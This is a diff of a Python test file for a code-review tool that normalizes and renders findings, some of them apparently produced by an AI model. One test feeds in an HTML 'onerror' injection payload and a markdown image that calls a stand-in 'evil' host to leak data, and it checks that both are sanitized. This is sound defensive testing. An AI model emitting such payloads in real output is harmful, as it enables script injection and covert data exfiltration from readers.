@@ -83,7 +83,7 @@ def test_merge_impact_policy():
 
 
 def test_critical_alone_is_not_a_blocker():
-    f = Finding("semantic.metric-definition-drift", "critical", "a.sql", 1, "t", "e", ["genie_one:q"], source="genie")
+    f = Finding("semantic.metric-definition-drift", "critical", "a.sql", 1, "t", "e", ["ev:genie_one:q"], source="genie")
     normalize([f], {}, Policy())
     assert f.severity == "high"                                  # semantic interpretation is capped at high
     assert f.merge_impact != "blocker"
@@ -166,7 +166,7 @@ def test_model_text_is_sanitized_before_rendering():
         "check": "semantic.metric-definition-drift", "severity": "high", "file": "a.sql", "line": 1,
         "title": "Bad <img src=x onerror=1> @team", "explanation": "see ![](https://evil/?d=1)", "evidence": ["ev:uc:c.s.m:metric_view"],
         "impact": "x", "suggestion": "y", "confidence": 0.9}]})
-    found, _, _ = publish.genie_findings(run, [PlanItem("semantic.metric-definition-drift", "t", "w")], {"ev:uc:c.s.m:metric_view"}, 0)
+    found, _, _ = publish.genie_findings(run, [PlanItem("semantic.metric-definition-drift", "t", "w")], {"ev:uc:c.s.m:metric_view"})
     review, md = build(findings=found, facts={"ev:uc:c.s.m:metric_view": {}}, summary="s")
     assert "<img" not in md and "evil" not in md and "@&#8203;team" in md
 
